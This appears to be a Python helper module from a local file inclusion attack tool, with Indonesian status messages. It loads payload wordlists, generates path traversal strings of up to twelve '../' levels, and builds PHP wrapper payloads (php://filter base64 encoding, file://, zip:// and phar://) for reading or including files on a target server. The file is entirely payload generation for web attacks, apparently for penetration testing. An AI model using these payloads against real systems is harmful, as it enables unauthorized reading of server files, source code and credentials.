from utils.banner import warning, info

def read_payloads(wordlist_path):
    try:
        with open(wordlist_path, 'r', encoding="utf-8", errors="ignore") as f:
            payloads = [line.strip() for line in f.readlines()]
            print(f"{info()} Berhasil memuat {len(payloads)} payload dari {wordlist_path}")
            return payloads
    except FileNotFoundError:
        print(f"{warning()} Error: File wordlist tidak ditemukan di '{wordlist_path}'")
        return None
    
def generate_traversal_payloads(filename, depth=12):
    payloads = [filename]
    for i in range(1, depth + 1):
        prefix = "../" * i
        payloads.append(prefix + filename)
    return payloads

def get_payloads(value, type):
    if type == 'file':
        return generate_traversal_payloads(value)
    elif type == 'path':
        return read_payloads(value)
    
def build_wrapper_payload(wrapper_type, args):
    if wrapper_type == 'php_filter':
        if len(args) != 1: return None
        return f"php://filter/convert.base64-encode/resource={args[0]}"
    
    if wrapper_type == 'file':
        if len(args) != 1: return None
        return f"file://{args[0]}"

    if wrapper_type == 'zip':
        if len(args) != 2: return None
        return f"zip://{args[0]}%23{args[1]}"

    if wrapper_type == 'phar':
        if len(args) != 2: return None
        return f"phar://{args[0]}/{args[1]}"
    
    return None